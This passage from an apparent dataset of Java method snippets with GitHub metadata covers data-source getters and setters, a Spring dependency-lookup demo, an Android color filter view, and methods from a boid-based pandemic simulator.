setModifyTime(Date modifyTime) {\n        this.modifyTime = modifyTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59805, "method_name": "getParameter", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getParameter() {\n        return parameter;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59806, "method_name": "setParameter", "class_name": "DataSourceBase", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setParameter(String parameter) {\n        this.parameterMap = null;\n        this.parameter = parameter;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59807, "method_name": "getParameterMap", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "    public Map<String, Object> getParameterMap() {\n        return parameterMap;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59808, "method_name": "setParameterMap", "class_name": "DataSourceBase", "params": ["Map<String,Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setParameterMap(Map<String, Object> parameterMap) {\n        this.parameterMap = parameterMap;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59809, "method_name": "toString", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString(){\n        return \"\";\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59810, "method_name": "getProjectId", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getProjectId() {\n        return projectId;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59811, "method_name": "setProjectId", "class_name": "DataSourceBase", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setProjectId(Long projectId) {\n        this.projectId = projectId;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59812, "method_name": "setBeanId", "class_name": "MobilePhone", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setBeanId(String beanId) {\n\t\tSystem.out.println(\"MobilePhone.setBeandId()\");\n\t\tthis.beanId = beanId;\n\t}", "url": "https://raw.githubusercontent.com/nataraz123/Spring/master/IOCProj57-DepedencyLookupWithAwareInjetction/src/main/java/com/nt/beans/MobilePhone.java", "stars": "8", "class_props": {"extends": null, "implements": ["ApplicationContextAware"], "modifiers": ["public"]}}, {"id": 59813, "method_name": "setApplicationContext", "class_name": "MobilePhone", "params": ["ApplicationContext"], "throws": ["BeansException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setApplicationContext(ApplicationContext ctx) throws BeansException {\n\tSystem.out.println(\"MobilePhone.setApplicationContext()\");\n\t\tthis.ctx=ctx;\n\t}", "url": "https://raw.githubusercontent.com/nataraz123/Spring/master/IOCProj57-DepedencyLookupWithAwareInjetction/src/main/java/com/nt/beans/MobilePhone.java", "stars": "8", "class_props": {"extends": null, "implements": ["ApplicationContextAware"], "modifiers": ["public"]}}, {"id": 59814, "method_name": "gaming", "class_name": "MobilePhone", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": " public   void gaming() {\n\t System.out.println(\"MobilePhone.gaming()::: PubG,Ludo and etc..\");\n }", "url": "https://raw.githubusercontent.com/nataraz123/Spring/master/IOCProj57-DepedencyLookupWithAwareInjetction/src/main/java/com/nt/beans/MobilePhone.java", "stars": "8", "class_props": {"extends": null, "implements": ["ApplicationContextAware"], "modifiers": ["public"]}}, {"id": 59815, "method_name": "shopping", "class_name": "MobilePhone", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": " public void  shopping() {\n\t System.out.println(\"MobilePhone.shopping()::: Amazon, Flipkart and etc..\");\n }", "url": "https://raw.githubusercontent.com/nataraz123/Spring/master/IOCProj57-DepedencyLookupWithAwareInjetction/src/main/java/com/nt/beans/MobilePhone.java", "stars": "8", "class_props": {"extends": null, "implements": ["ApplicationContextAware"], "modifiers": ["public"]}}, {"id": 59816, "method_name": "entertainment", "class_name": "MobilePhone", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": " public  void entertainment() {\n\t System.out.println(\"MobilePhone.entertainment():: Prime Vedio, netflix and etc..\");\n }", "url": "https://raw.githubusercontent.com/nataraz123/Spring/master/IOCProj57-DepedencyLookupWithAwareInjetction/src/main/java/com/nt/beans/MobilePhone.java", "stars": "8", "class_props": {"extends": null, "implements": ["ApplicationContextAware"], "modifiers": ["public"]}}, {"id": 59817, "method_name": "calls", "class_name": "MobilePhone", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": " public  void calls() {\n\t System.out.println(\"MobilePhone.calls():: Incoming and outgoing calls\");\n }", "url": "https://raw.githubusercontent.com/nataraz123/Spring/master/IOCProj57-DepedencyLookupWithAwareInjetction/src/main/java/com/nt/beans/MobilePhone.java", "stars": "8", "class_props": {"extends": null, "implements": ["ApplicationContextAware"], "modifiers": ["public"]}}, {"id": 59818, "method_name": "batteryCharging", "class_name": "MobilePhone", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": " public void batteryCharging() {\n\t\n\t MobilePhoneBatteryCharger charger=null;\n\t\n\t System.out.println(\"MobilePhone.batteryCharging()\");\n\t //get Depedent Bean class object  through Dependency lookup\n\t charger=ctx.getBean(beanId,MobilePhoneBatteryCharger.class);\n\t //invoke method\n\t charger.charging();\n\t \n }", "url": "https://raw.githubusercontent.com/nataraz123/Spring/master/IOCProj57-DepedencyLookupWithAwareInjetction/src/main/java/com/nt/beans/MobilePhone.java", "stars": "8", "class_props": {"extends": null, "implements": ["ApplicationContextAware"], "modifiers": ["public"]}}, {"id": 59819, "method_name": "onDraw", "class_name": "Practice06LightingColorFilterView", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {\n        super.onDraw(canvas);\n\n        // \u4f7f\u7528 Paint.setColorFilter() \u6765\u8bbe\u7f6e LightingColorFilter\n\n        // \u7b2c\u4e00\u4e2a LightingColorFilter\uff1a\u53bb\u6389\u7ea2\u8272\u90e8\u5206\n        paint.setColorFilter(reduceRedFilter);\n        canvas.drawBitmap(bitmap, 0, 0, paint);\n\n        // \u7b2c\u4e8c\u4e2a LightingColorFilter\uff1a\u589e\u5f3a\u7eff\u8272\u90e8\u5206\n        paint.setColorFilter(addGreenFilter);\n        canvas.drawBitmap(bitmap, bitmap.getWidth() + 100, 0, paint);\n\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson2/Practice06LightingColorFilterView.java", "stars": "2", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 59820, "method_name": "addHeaders", "class_name": "EmptyHeadersInjector", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Map<String,String>", "snippet": "    public Map<String, String> addHeaders(String url) {\n        return new HashMap<>();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/headers/EmptyHeadersInjector.java", "stars": "2", "class_props": {"extends": null, "implements": ["HeaderInjector"], "modifiers": ["public"]}}, {"id": 59821, "method_name": "paintComponent", "class_name": "BoidRunner", "params": ["Graphics"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void paintComponent(Graphics page) {\n        super.paintComponent(page);\n        Graphics2D g = (Graphics2D) page;\n        g.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);\n        for(Boid boid: flock) {\n            boid.draw(g);\n        }\n    }", "url": "https://raw.githubusercontent.com/IvanHornung/Pandemic-Simulator/master/src/app/BoidRunner.java", "stars": "22", "class_props": {"extends": "JPanel", "implements": ["KeyListener", "MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 59822, "method_name": "run", "class_name": "BoidRunner", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void run() {\n        while(true) {\n            int toAdd = 0;\n            totalInfected = 0; healthyCount = 0; recoveryCount = 0; visiblyDead = 0; diagnosedCount = 0; paramedicCount = 0; paranoidCount = 0;\n            for(int i = 0; i < flock.size(); i++){\n                flock.get(i).edges();\n                flock.get(i).flock(flock);\n                flock.get(i).update();\n                if(flock.get(i).isParamedic)\n                    paramedicCount++;\n                else if(flock.get(i).healthStatus == Boid.HEALTHY)\n                    healthyCount++;\n                else if(flock.get(i).healthStatus == Boid.INFECTED)\n                    totalInfected++;\n                else if(flock.get(i).healthStatus == Boid.RECOVERED)\n                    recoveryCount++;\n                else if(flock.get(i).healthStatus == flock.get(i).DIAGNOSED)\n                    diagnosedCount++;\n                else if(flock.get(i).healthStatus == Boid.PARANOID)\n                    paranoidCount++;\n                else\n                    visiblyDead++;\n                if(flock.get(i).dead && ((int)(Math.random()*(totalInfected*600+((totalInfected == 0)?1:0))) <= visiblyDead)) {\n                    flock.remove(i);\n                    i--;\n                    toAdd++;\n                } else if(flock.get(i).isParamedic && totalInfected <= flock.size()*0.25 && (int)(Math.random()*10000*(flock.size()-totalInfected)) == 0) {\n                    flock.remove(i);\n                    i--;\n                    toAdd++;\n                    new Sound(\"bell.wav\");\n                }\n                else if(flock.get(i).isParamedic && Boid.lockedOn) {\n                    flock.get(i).sirenCount++;\n                    if(flock.get(i).sirenCount % 3 == 0) {\n                        flock.get(i).sirens++;\n                        if(flock.get(i).sirens==0)\n                            flock.get(i).PARAMEDIC = Color.BLUE;\n                        else if(flock.get(i).sirens==1)\n                            flock.get(i).PARAMEDIC = Color.WHITE;\n                        else if(flock.get(i).sirens == 2)\n                            flock.get(i).PARAMEDIC = Color.RED;\n                        flock.get(i).healthStatus = flock.get(i).PARAMEDIC;\n                    } if(flock.get(i).sirens > 2) flock.get(i).sirens = -1;\n                } else if(flock.get(i).isParamedic && flock.get(i).PARAMEDIC != Color.BLUE) {\n                    flock.get(i).PARAMEDIC = Color.BLUE;\n                    flock.get(i).healthStatus = flock.get(i).PARAMEDIC;\n                }\n                if((int)(Math.random()*healthyCount*2000+((healthyCount == 0)?1:0)) == 0 && \n                        !flock.get(i).hasDisease && diagnosedCount >= 3 && \n                        flock.get(i).healthStatus != Boid.PARANOID && paranoidCount <= 15) {\n                    flock.get(i).healthStatus = Boid.PARANOID;\n                    new Sound(\"paranoia.wav\");\n                } if(recoveryCount >= 800 && flock.get(i).healthStatus == Boid.PARANOID &&\n                        (int)(Math.random()*totalInfected*200+((totalInfected == 0)?1:0)) == 0 ) {\n                    flock.get(i).healthStatus = Boid.HEALTHY;\n                    new Sound(\"paranoiaEnded.wav\");\n                }\n            }\n            if(clearGrid) {\n                for(int i = 0; i < flock.size(); i++) {\n                    flock.remove(i);\n                    i--;\n                }\n                clearGrid = false;\n            }\n            if(addedBoids.size() != 0) {\n                for(int i = 0; i < addedBoids.size(); i++) {\n                    flock.add(addedBoids.get(i));\n                    addedBoids.remove(i);\n                    i--;\n                }\n            }\n            if(paramedicCount <= 2 && diagnosedCount != 0) {\n                flock.add(new Boid(true));\n                new Sound(\"ambulance.wav\");\n            }\n            if(!intensityPlayed && (flock.size()+1)%100 == 0) \n                intensityPlayed = true;\n            if(totalInfected == 0)\n                flock.add(new Boid((int)(Math.random()*WIDTH), (int)(Math.random()*HEIGHT), true));\n            else if(totalInfected >= (int)(flock.size()*0.8) && !intensityPlayed) {\n                new Sound(\"intensity.wav\");\n                intensityPlayed = !intensityPlayed;\n            }\n            if(deathCount >= 100) {\n                if(!milestonePlayed && deathCount % 100 == 0) {\n                    new Sound(\"deathmilestone.wav\");\n                    milestonePlayed = true;\n                } else if((deathCount-1)%100 == 0)\n                    milestonePlayed = false;\n            }\n            updateValues();\n            for(int i = 0; i < toAdd; i++)\n                flock.add(new Boid());\n            int more = (int)(Math.random()*((flock.size()>=900) ? 1000 : 500));\n            if(more == 0)\n                flock.add(new Boid());\n            if(addedNewBoid) {\n                flock.add(new Boid(mouseXPosition, mouseYPosition, false));\n                addedNewBoid = false;\n            }\n            this.repaint();\n            try {\n                Thread.sleep(10);\n            } catch( InterruptedException ex ){}\n        }\n    }", "url": "https://raw.githubusercontent.com/IvanHornung/Pandemic-Simulator/master/src/app/BoidRunner.java", "stars": "22", "class_props": {"extends": "JPanel", "implements": ["KeyListener", "MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 59823, "method_name": "createLabels", "class_name": "BoidRunner", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void createLabels() {\n        //Healthy\n        healthyDisplay = new JLabel(\"Healthy: \"+ healthyCount);\n        this.setLayout(new FlowLayout());\n        this.add(healthyDisplay);\n        healthyDisplay.setFont(new Font(\"Courier New\", Font.PLAIN, 20));\n        healthyDisplay.setForeground(Color.WHITE);\n        healthyDisplay.setVisible(true);\n        healthyDisplay.setLocation((int)WIDTH/2-400, 200);\n        //Infected\n        infectedDisplay = new JLabel(\" Infected: \"+ totalInfected);\n        this.setLayout(new FlowLayout());\n        this.add(infectedDisplay);\n        infectedDisplay.setFont(new Font(\"Courier New\", Font.PLAIN, 20));\n        infectedDisplay.setForeground(Color.RED);\n        infectedDisplay.setVisible(true);\n        infectedDisplay.setLocation((int)WIDTH/2, 200);\n        //Recovered\n        recoveredDisplay = new JLabel(\" Recovered: \"+ criticalCount);\n        this.setLayout(new FlowLayout());\n        this.add(recoveredDisplay);\n        recoveredDisplay.setFont(new Font(\"Courier New\", Font.PLAIN, 20));\n        recoveredDisplay.setForeground(Boid.RECOVERED);\n        recoveredDisplay.setVisible(true);\n        recoveredDisplay.setLocation((int)WIDTH/2+400, 200);\n        //Death\n        deathDisplay = new JLabel(\" Dead: \"+ deathCount);\n        this.setLayout(new FlowLayout());\n        this.add(deathDisplay);\n        deathDisplay.setFont(new Font(\"Courier New\", Font.PLAIN, 20));\n        deathDisplay.setForeground(Boid.DEAD);\n        deathDisplay.setVisible(true);\n        deathDisplay.setLocation((int)WIDTH/2+200, 300);\n    }", "url": "https://raw.githubusercontent.com/IvanHornung/Pandemic-Simulator/master/src/app/BoidRunner.java", "stars": "22", "class_props": {"extends": "JPanel", "implements": ["KeyListener", "MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 59824, "method_name": "toggleCounts", "class_name": "BoidRunner", "params": ["boolean"], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "    static void toggleCounts(boolean setting) {\n        healthyDisplay.setVisible(setting);\n        infectedDisplay.setVisible(setting);\n        recoveredDisplay.setVisible(setting);\n        deathDisplay.setVisible(setting);\n    }", "url": "https://raw.githubusercontent.com/IvanHornung/Pandemic-Simulator/master/src/app/BoidRunner.java", "stars": "22", "class_props": {"extends": "JPanel", "implements": ["KeyListener", "MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 59825, "method_name": "updateValues", "class_name": "BoidRunner", "params": [], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "    static void updateValues() {\n        healthyDisplay.setText(\"Healthy: \" + healthyCount);\n        infectedDisplay.setText(\" Infected: \" + totalInfected);\n        recoveredDisplay.setText(\" Recovered: \" + recoveryCount);\n        deathDisplay.setText(\" Dead: \" + deathCount);\n    }", "url": "https://raw.githubusercontent.com/IvanHornung/Pandemic-Simulator/master/src/app/BoidRunner.java", "stars": "22", "class_props": {"extends": "JPanel", "implements": ["KeyListener", "MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 59826, "method_name": "updateHealthy", "class_name": "BoidRunner", "params": [], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "    static void updateHealthy() {\n        healthyCount = flock.size()-totalInfected-deathCount;\n        healthyDisplay.setText(\"Healthy: \" + healthyCount);\n    }", "url": "https://raw.githubusercontent.com/IvanHornung/Pandemic-Simulator/master/src/app/BoidRunner.java", "stars": "22", "class_props": {"extends": "JPanel", "implements": ["KeyListener", "MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 59827, "method_name": "updateInfected", "class_name": "BoidRunner", "params": [], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "    static void updateInfected() {\n        totalInfected++;\n        healthyCount--;\n        infectedDisplay.setText(\" Infected: \" + totalInfected);\n        new Sound(\"newpatient.wav\");\n    }", "url": "https://raw.githubusercontent.com/IvanHornung/Pandemic-Simulator/master/src/app/BoidRunner.java", "stars": "22", "class_props": {"extends": "JPanel", "implements": ["KeyListener", "MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 59828, "method_name": "updateRecovered", "class_name": "BoidRunner", "params": [], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "    static void updateRecovered() {\n        recoveryCount++;\n        healthyCount++;\n        totalInfected--;\n        infectedDisplay.setText(\" Infected: \" + totalInfected);\n        recoveredDisplay.setText(\" Recovered: \" + recoveryCount);\n        new Sound(\"recovery.wav\");\n    }", "url": "https://raw.githubusercontent.com/IvanHornung/Pandemic-Simulator/master/src/app/BoidRunner.java", "stars": "22", "class_props": {"extends": "JPanel", "implements": ["KeyListener", "MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 59829, "method_name": "updateDead", "class_name": "BoidRunner", "params": [], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "    static void updateDead() {\n        deathCount++;\n        totalInfected--;\n        infectedDisplay.setText(\" Infected: \" + totalInfected);\n        deathDisplay.setText(\" Dead: \" + deathCount);\n        new Sound(\"death.wav\");\n    }", "url": "https://raw.githubusercontent.com/IvanHornung/Pandemic-Simulator/master/src/app/BoidRunner.java", "stars": "22", "class_props": {"extends": "JPanel", "implements": ["KeyListener", "MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 59830, "method_name": "updateCritical", "class_name": "BoidRunner", "params": [], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "    static void updateCritical() {\n        criticalCount++;\n        criticalDisplay.setText(\" Critical: \" + criticalCount);\n    }", "url": "https://raw.githubusercontent.com/IvanHornung/Pandemic-Simulator/master/src/app/BoidRunner.java", "stars": "22", "class_props": {"extends": "JPanel", "implements": ["KeyListener", "MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 59831, "method_name": "updateAlive", "class_name": "BoidRunner", "params": [], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "    static void updateAlive() {\n        aliveCount = flock.size()-deathCount;\n        aliveDisplay.setText(\" Alive: \" + aliveCount);\n    }", "url": "https://raw.githubusercontent.com/IvanHornung/Pandemic-Simulator/master/src/app/BoidRunner.java", "stars": "22", "class_props": {"extends": "JPanel", "implements": ["KeyListener", "MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 59832, "method_name": "lostImmunity", "class_name": "BoidRunner", "params": [], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "    static void lostImmunity() {\n        recoveryCount--;\n        recoveredDisplay.setText(\" Recovered: \" + recoveryCount);\n        new Sound(\"immunitylost.wav\");\n    }", "url": "https://raw.githubusercontent.com/IvanHornung/Pandemic-Simulator/master/src/app/BoidRunner.java", "stars": "22", "class_props": {"extends": "JPanel", "implements": ["KeyListener", "MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 59833, "method_name": "keyReleased", "class_name": "BoidRunner", "params": ["KeyEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void keyReleased( KeyEvent event ) {}", "url": "https://raw.githubusercontent.com/IvanHornung/Pandemic-Simulator/master/src/app/BoidRunner.java", "stars": "22", "class_props": {"extends": "JPanel", "implements": ["KeyListener", "MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 59834, "method_name": "keyPressed", "class_name": "BoidRunner", "params": ["KeyEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void keyPressed( KeyEvent event ) {\n        //General\n        if(event.getKeyCode() == KeyEvent.VK_P)\n            Boid.incrementSeparationMaxForce();\n        else if(event.getKeyCode() == KeyEvent.VK_SEMICOLON)\n            Boid.decrementSeparationMaxForce();\n        //Toggles\n        else if(event.getKeyCode() == KeyEvent.VK_Q)\n            toggleCounts(true);\n        else if(event.getKeyCode() == KeyEvent.VK_E)\n            toggleCounts(false);\n        else if(event.getKeyCode() == KeyEvent.VK_W)\n            Sound.tickOff = !Sound.tickOff;\n        //Sounds\n        //Decorative\n        else if(event.getKeyCode() == KeyEvent.VK_B)\n            new Sound(\"bell.wav\");\n        else if(event.getKeyCode() == KeyEvent.VK_N)\n            new Sound(\"ambulance.wav\");\n        else if(event.getKeyCode() == KeyEvent.VK_SLASH)\n            music.stopSong();\n        else if(event.getKeyCode() == KeyEvent.VK_PERIOD)\n            music = new Sound(\"plague.wav\");\n        //Demonstrative\n        else if(event.getKeyCode() == KeyEvent.VK_1)\n            new Sound(\"newpatient.wav\");\n        else if(event.getKeyCode() == KeyEvent.VK_2)\n            new Sound(\"recovery.wav\");\n        else if(event.getKeyCode() == KeyEvent.VK_3)\n            new Sound(\"immunitylost.wav\");\n        else if(event.getKeyCode() == KeyEvent.VK_4)\n            new Sound(\"death.wav\");\n        else if(event.getKeyCode() == KeyEvent.VK_5)\n            new Sound(\"diagnosis.wav\");\n        else if(event.getKeyCode() == KeyEvent.VK_6)\n            new Sound(\"paranoia.wav\");\n        else if(event.getKeyCode() == KeyEvent.VK_7)\n            new Sound(\"paranoiaEnded.wav\");\n        else if(event.getKeyCode() == KeyEvent.VK_8)\n            new Sound(\"treatment.wav\");\n        else if(event.getKeyCode() == KeyEvent.VK_9)\n            new Sound(\"deathmilestone.wav\");\n        else if(event.getKeyCode() == KeyEvent.VK_0)\n            new Sound(\"intensity.wav\");\n        //Demonstations\n        else if(event.getKeyCode() == KeyEvent.VK_BACK_SLASH) { //Clear grid\n            new Sound(\"bell.wav\");\n            clearGrid = true;\n        }\n        else if(event.getKeyCode() == KeyEvent.VK_R) { //Add healthy\n            new Sound(\"recovery.wav\");\n            addedBoids.add(new Boid((int)((Math.random()*0.2+0.9)*WIDTH/2),(int)((Math.random()*0.2+0.9)*HEIGHT/2), false));\n        }\n        else if(event.getKeyCode() == KeyEvent.VK_F) { //Add infected\n            new Sound(\"recovery.wav\");\n            addedBoids.add(new Boid((int)((Math.random()*0.2+0.9)*WIDTH/2),(int)((Math.random()*0.2+0.9)*HEIGHT/2), true));\n        }\n        else if(event.getKeyCode() == KeyEvent.VK_T) { //Add recovered\n            new Sound(\"recovery.wav\");\n            Boid recoveredBoid = new Boid((int)((Math.random()*0.2+0.9)*WIDTH/2),(int)((Math.random()*0.2+0.9)*HEIGHT/2), false);\n            recoveredBoid.isImmune = true;\n            recoveredBoid.healthStatus = Boid.RECOVERED;\n            recoveredBoid.immunity = recoveredBoid.immunityCap * (Math.random()*50+100);\n            recoveredBoid.immunityCap = recoveredBoid.immunity;\n            recoveredBoid.immunityLife = recoveredBoid.initialLifeSpan*(6*(Math.random()*0.8+0.5));\n            addedBoids.add(recoveredBoid);\n        }\n        else if(event.getKeyCode() == KeyEvent.VK_G) { //Add dead\n            new Sound(\"recovery.wav\");\n            Boid deadBoid = new Boid((int)((Math.random()*0.2+0.9)*WIDTH/2),(int)((Math.random()*0.2+0.9)*HEIGHT/2), false);\n            deadBoid.dead = true;\n            deadBoid.healthStatus = Boid.DEAD;\n            addedBoids.add(deadBoid);\n        }\n        else if(event.getKeyCode() == KeyEvent.VK_Y) { //Add paramedic\n            new Sound(\"recovery.wav\");\n            addedBoids.add(new Boid(true));\n        }\n        else if(event.getKeyCode() == KeyEvent.VK_H) { //Add diagnosed\n            new Sound(\"recovery.wav\");\n            new Sound(\"diagnosis.wav\");\n            Boid diagnosedBoid = new Boid((int)((Math.random()*0.2+0.9)*WIDTH/2),(int)((Math.random()*0.2+0.9)*HEIGHT/2), true);\n            diagnosedBoid.diagnosed = true;\n            diagnosedBoid.healthStatus = diagnosedBoid.DIAGNOSED;\n            addedBoids.add(diagnosedBoid);\n        }\n        else if(event.getKeyCode() == KeyEvent.VK_U) { //Add paranoid\n            new Sound(\"recovery.wav\");\n            Boid paranoidBoid = new Boid((int)((Math.random()*0.2+0.9)*WIDTH/2),(int)((Math.random()*0.2+0.9)*HEIGHT/2), false);\n            paranoidBoid.healthStatus = Boid.PARANOID;\n            addedBoids.add(paranoidBoid);\n        }\n\n    }", "url": "https://raw.githubusercontent.com/IvanHornung/Pandemic-Simulator/master/src/app/BoidRunner.java", "stars": "22", "class_props": {"extends": "JPanel", "implements": ["KeyListener", "MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 59835, "method_name": "keyTyped", "class_name": "BoidRunner", "params": ["KeyEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void keyTyped(KeyEvent event) {}", "url": "https://raw.githubusercontent.com/IvanHornung/Pandemic-Simulator/master/src/app/BoidRunner.java", "stars": "22", "class_props": {"extends": "JPanel", "implements": ["KeyListener", "MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 59836, "method_name": "mousePressed", "class_name": "BoidRunner", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mousePressed(MouseEvent event) {\n        mouseXPosition = event.getX();   \n        mouseYPosition = event.getY();\n        addedNewBoid = true;\n    }", "url": "https://raw.githubusercontent.com/IvanHornung/Pandemic-Simulator/master/src/app/BoidRunner.java", "stars": "22", "class_props": {"extends": "JPanel", "implements": ["KeyListener", "MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 59837, "method_name": "mouseClicked", "class_name": "BoidRunner", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseClicked( MouseEvent event ) {}", "url": "https://raw.githubusercontent.com/IvanHornung/Pandemic-Simulator/master/src/app/BoidRunner.java", "stars": "22", "class_props": {"extends": "JPanel", "implements": ["KeyListener", "MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 59838, "method_name": "mouseReleased", "class_name": "BoidRunner", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseReleased( MouseEvent event ) {}", "url": "https://raw.githubusercontent.com/IvanHornung/Pandemic-Simulator/master/src/app/BoidRunner.java", "stars": "22", "class_props": {"extends": "JPanel", "implements": ["KeyListener", "MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 59839, "method_name": "mouseEntered", "class_name": "BoidRunner", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseEntered( MouseEvent event ) {}", "url": "https://raw.githubusercontent.com/IvanHornung/Pandemic-Simulator/master/src/app/BoidRunner.java", "stars": "22", "class_props": {"extends": "JPanel", "implements": ["KeyListener", "MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 59840, "method_name": "mouseExited", "class_name": "BoidRunner", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseExited( MouseEvent event ) {}", "url": "https://raw.githubusercontent.com/IvanHornung/Pandemic-Simulator/master/src/app/BoidRunner.java", "stars": "22", "class_props": {"extends": "JPanel", "implements": ["KeyListener", "MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 59841, "method_name": "mouseMoved", "class_name": "BoidRunner", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseMoved(MouseEvent event) {}", "url": "https://raw.githubusercontent.com/IvanHornung/Pandemic-Simulator/master/src/app/BoidRunner.java", "stars": "22", "class_props": {"extends": "JPanel", "implements": ["KeyListener", "MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 59842, "method_name": "mouseDragged", "class_name": "BoidRunner", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseDragged(MouseEvent event) {}", "url": "https://raw.githubusercontent.com/IvanHornung/Pandemic-Simulator/master/src/app/BoidRunner.java", "stars": "22", "class_props": {"extends": "JPanel", "implements": ["KeyListener", "MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 59843, "method_name": "testConcatStrings_SwapOrder", "class_name": 